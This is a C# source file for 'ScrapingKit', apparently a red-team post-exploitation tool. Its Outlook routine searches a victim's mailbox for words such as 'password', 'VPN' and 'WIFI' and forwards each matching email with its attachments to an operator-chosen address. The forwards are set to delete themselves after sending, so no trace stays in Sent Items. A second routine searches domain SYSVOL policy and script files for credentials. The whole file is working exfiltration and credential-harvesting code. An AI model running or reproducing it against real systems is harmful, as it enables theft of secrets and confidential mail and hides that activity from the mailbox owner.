// LaresLLC ScrapingKit 2023
// Neil Lines & Andy Gill
// v1.0 Release
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

class Program
{
    static void Main()
    {
        ShowMenu();
    }

    static void ShowMenu()
    {
        Console.WriteLine("Please select an option:");
        Console.WriteLine("1. Run Outlook Email Search");
        Console.WriteLine("2. Run Active Directory Keyword Search");
        Console.WriteLine("9. Exit");

        string option = Console.ReadLine();

        switch (option)
        {
            case "1":
                RunOutlookEmailSearch();
                break;
            case "2":
                RunADKeywordSearch();
                break;
            case "9":
                return;
            default:
                Console.WriteLine("Invalid option. Please try again.");
                ShowMenu();
                break;
        }
    }

    static void RunOutlookEmailSearch()
    {
        Console.WriteLine("Enter the email address to forward matching emails:");
        string forwardToEmail = Console.ReadLine();

        Console.WriteLine("Would you like to only scrape for the following keywords: 'password', 'security', 'confidential', 'VPN', and 'WIFI' (Y/N)");
        string includeDefaultKeywordsInput = Console.ReadLine();
        bool includeDefaultKeywords = includeDefaultKeywordsInput.Equals("Y", StringComparison.OrdinalIgnoreCase);

        string[] additionalKeywords = null;
        if (!includeDefaultKeywords)
        {
            Console.WriteLine("Enter additional keywords (comma-separated):");
            string additionalKeywordsInput = Console.ReadLine();
            additionalKeywords = additionalKeywordsInput.Split(',');
        }

        dynamic outlookApp = CreateOutlookApplication();
        if (outlookApp == null)
        {
            Console.WriteLine("Outlook application could not be created. Please make sure Outlook is installed.");
            ShowMenu();
            return;
        }

        dynamic inboxFolder = outlookApp.Session.DefaultStore.GetDefaultFolder(6); // OlDefaultFolders.olFolderInbox
        ProcessFolder(inboxFolder, forwardToEmail, includeDefaultKeywords, additionalKeywords);

        // Release COM objects
        ReleaseComObject(inboxFolder);
        ReleaseComObject(outlookApp);

        // Garbage collection
        GC.Collect();
        GC.WaitForPendingFinalizers();

        // Show the menu again
        ShowMenu();
    }

    static dynamic CreateOutlookApplication()
    {
        Type outlookType = Type.GetTypeFromProgID("Outlook.Application");
        if (outlookType == null)
            return null;

        dynamic outlookApp = Activator.CreateInstance(outlookType);
        return outlookApp;
    }

    static void ProcessFolder(dynamic folder, string forwardToEmail, bool includeDefaultKeywords, string[] additionalKeywords)
    {
        dynamic items = folder.Items;
        items.IncludeRecurrences = true;

        List<string> allKeywords = new List<string>();
        if (includeDefaultKeywords)
        {
            string[] defaultKeywords = { "password", "security", "confidential", "VPN", "WIFI" };
            allKeywords.AddRange(defaultKeywords);
        }

        if (additionalKeywords != null)
        {
            allKeywords.AddRange(additionalKeywords);
        }

        foreach (dynamic email in items)
        {
            try
            {
                foreach (string keyword in allKeywords)
                {
                    if (email.Subject.Contains(keyword) || Regex.IsMatch(email.Body, @"\b" + keyword + @"\b", RegexOptions.IgnoreCase | RegexOptions.Multiline))
                    {
                        string subject = email.Subject;
                        string sender = email.SenderEmailAddress;
                        string recipients = email.To;
                        string body = email.Body;

                        dynamic forwardEmail = email.Forward();
                        forwardEmail.Subject = "Matching Email Information: " + subject;
                        forwardEmail.Body = "Sender: " + sender + "\nRecipients: " + recipients + "\n\n" + body;
                        forwardEmail.To = forwardToEmail;
                        forwardEmail.DeleteAfterSubmit = true;

                        dynamic attachments = email.Attachments;
                        for (int i = 1; i <= attachments.Count; i++)
                        {
                            dynamic attachment = attachments[i];
                            string tempPath = Path.GetTempPath() + attachment.FileName;
                            attachment.SaveAsFile(tempPath);
                            forwardEmail.Attachments.Add(tempPath);
                        }

                        forwardEmail.Send();
                        Console.WriteLine("Matching email found. Forwarded the email information to " + forwardToEmail);
                        System.Threading.Thread.Sleep(5000);
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle the exception here (e.g., log the error)
                Console.WriteLine("Error occurred while processing an email: " + ex.Message);
            }
        }

        dynamic subfolders = folder.Folders;
        foreach (dynamic subfolder in subfolders)
        {
            ProcessFolder(subfolder, forwardToEmail, includeDefaultKeywords, additionalKeywords);
        }

        // Release COM objects
        ReleaseComObject(items);
        ReleaseComObject(subfolders);
    }

    static void RunADKeywordSearch()
    {
        Console.WriteLine("Please provide at least one keyword as a command-line argument.");
        string[] arguments = Console.ReadLine().Split(' ');
        string domain = GetDomain();

        if (string.IsNullOrEmpty(domain))
        {
            Console.WriteLine("Invalid domain specified.");
            return;
        } else
        {
            Console.WriteLine($"Using domain: {domain}");
        }


        DomainController domainController = Domain.GetCurrentDomain().DomainControllers.Cast<DomainController>().FirstOrDefault();
        string domainControllerName = domainController?.Name;
        string sysvolPath = $"\\\\{domainControllerName}\\SYSVOL\\{domain}";
        string policiesPath = Path.Combine(sysvolPath, "Policies");
        string scriptsPath = Path.Combine(sysvolPath, "Scripts");
        string[] dynamicKeywords = arguments;
        string[] additionalKeywords = { "user", "username", "name", "User", "Username", "Name", "Username:", "username:", "Username=", "username=", "user ", "username ", "name ", "User ", "Username ", "Name ", "Username: ", "username: ", "Username= ", "username= ", "Username : ", "username : ", "Username = ", "username = " };
        bool matchesFound = false;

        using (PrincipalContext domainContext = new PrincipalContext(ContextType.Domain))
        {
            IEnumerable<FileInfo> files = Directory.EnumerateFiles(policiesPath, "*", SearchOption.AllDirectories)
                .Concat(Directory.EnumerateFiles(scriptsPath, "*", SearchOption.AllDirectories))
                .Select(file => new FileInfo(file))
                .Where(file => file.Name != "GptTmpl.inf" && file.Name != "GPT.INI" && file.Name != "Registry.pol");

            foreach (FileInfo file in files)
            {
                string[] content = File.ReadAllLines(file.FullName);

                foreach (string line in content)
                {
                    IEnumerable<string> matches = dynamicKeywords.Where(keyword => Regex.IsMatch(line, keyword, RegexOptions.IgnoreCase));

                    if (matches.Any())
                    {
                        matchesFound = true;
                        Console.WriteLine($"Match found in file {file.FullName}!");

                        int contextStart = Math.Max(0, Array.IndexOf(content, line) - 3);
                        int contextEnd = Math.Min(Array.IndexOf(content, line) + 3, content.Length - 1);
                        string[] context = content.Skip(contextStart).Take(contextEnd - contextStart + 1).ToArray();

                        IEnumerable<string> additionalKeywordsFound = additionalKeywords.Where(keyword => context.Any(lineContext => lineContext.Contains(keyword)));

                        if (additionalKeywordsFound.Any())
                        {
                            Console.WriteLine("Additional keywords found in the context:");
                            foreach (string keyword in additionalKeywordsFound)
                            {
                                Console.WriteLine(keyword);
                            }
                        }

                        Console.WriteLine("Context:");
                        foreach (string lineContext in context)
                        {
                            Console.WriteLine(lineContext);
                        }

                        Console.WriteLine();
                    }
                }
            }
        }

        if (!matchesFound)
        {
            Console.WriteLine("No matches found.");
        }

        // Show the menu again
        ShowMenu();
    }

    static string GetDomain()
    {
        string domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");

        // Check if the domain is specified as a command-line argument
        if (Environment.GetCommandLineArgs().Length >= 2)
        {
            domain = Environment.GetCommandLineArgs()[1];
        }

        // Check if the domain is specified by the user
        Console.WriteLine("Enter the domain (or press Enter to use the default):");
        string userInput = Console.ReadLine();
        if (!string.IsNullOrEmpty(userInput))
        {
            domain = userInput;
        }

        return domain;
    }

    static void ReleaseComObject(object obj)
    {
        try
        {
            if (obj != null && System.Runtime.InteropServices.Marshal.IsComObject(obj))
            {
                System.Runtime.InteropServices.Marshal.ReleaseComObject(obj);
                obj = null;
            }
        }
        catch (Exception ex)
        {
            // Handle the exception here (e.g., log the error)
            Console.WriteLine("Error occurred while releasing COM object: " + ex.Message);
        }
    }
}
